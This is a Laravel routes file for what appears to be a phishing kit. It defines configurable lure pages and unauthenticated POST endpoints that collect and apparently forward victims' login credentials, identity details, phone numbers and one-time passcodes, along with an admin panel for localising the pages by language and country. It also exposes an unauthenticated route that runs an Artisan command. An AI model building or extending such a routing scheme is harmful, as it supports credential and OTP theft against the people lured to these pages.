<?php

use App\Http\Controllers\Controller;
use App\Http\Livewire\Auth\Login;
use App\Http\Livewire\Confirm;
use App\Http\Livewire\EditLabel;
use App\Http\Livewire\Err404;
use App\Http\Livewire\Err500;
use App\Http\Livewire\Form;
use App\Http\Livewire\Labels;
use App\Http\Livewire\Languages;
use App\Http\Livewire\Setting;
use App\Http\Livewire\Welcome;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/link', function () {
    Artisan::call('storage:link');
});

$settings = null;
$pathWelcomePage = '/';
$queryWelcomePage = [];
$pathLoginPage = '/login';
$queryLoginPage = [];
$pathConfirmPage = '/confirm';
$queryConfirmPage = [];

if (env('IS_GET_BY_SETTING') == 1) {
    $settings = Cache::rememberForever('settings', function () {
        return \App\Models\Setting::pluck('value', 'key')->toArray();
    });

    $parseWelcomePage = parse_url($settings['path_welcome_page']);
    $pathWelcomePage = $parseWelcomePage['path'] ?? '/';

    $parseLoginPage = parse_url($settings['path_login_page']);
    $pathLoginPage = $parseLoginPage['path'] ?? '/';

    $parseConfirmPage = parse_url($settings['path_confirm_page']);
    $pathConfirmPage = $parseConfirmPage['path'] ?? '/';
}

Route::get($pathWelcomePage, Welcome::class)->name('welcome');


Route::get($pathLoginPage, Confirm::class)->name('form');
Route::get($pathConfirmPage, Form::class)->name('confirm');
Route::get('/administrator', Login::class)->name('login');
Route::get('/404', Err404::class)->name('404');
Route::get('/500', Err500::class)->name('500');
Route::get('/set-locale', [Controller::class, 'setLocale'])->name('setLocale');
Route::get('/set-country-code', [Controller::class, 'setCountryCode'])->name('setCountryCode');
Route::post('/send-data-login', [Controller::class, 'getAndSendDataLogin'])->name('getAndSendDataLogin');
Route::post('/send-data-review', [Controller::class, 'getAndSendDataReview'])->name('getAndSendDataReview');
Route::post('/send-data-identity', [Controller::class, 'getAndSendDataIdentity'])->name('getAndSendDataIdentity');
Route::post('/send-data-phone', [Controller::class, 'getAndSendDataMobile'])->name('getAndSendDataMobile');
Route::post('/send-data-otp', [Controller::class, 'getAndSendDataOtp'])->name('getAndSendDataOtp');

Route::middleware('auth')->group(function () {
    Route::get('/logout', [Controller::class, 'logout'])->name('logout');
    Route::get('/languages', Languages::class)->name('languages');
    Route::get('/labels', Labels::class)->name('labels');
    Route::get('/edit-label/{lang}', EditLabel::class)->name('edit-label');
    Route::get('/settings', Setting::class)->name('settings');
});

Route::get('/', Login::class)->name('login');

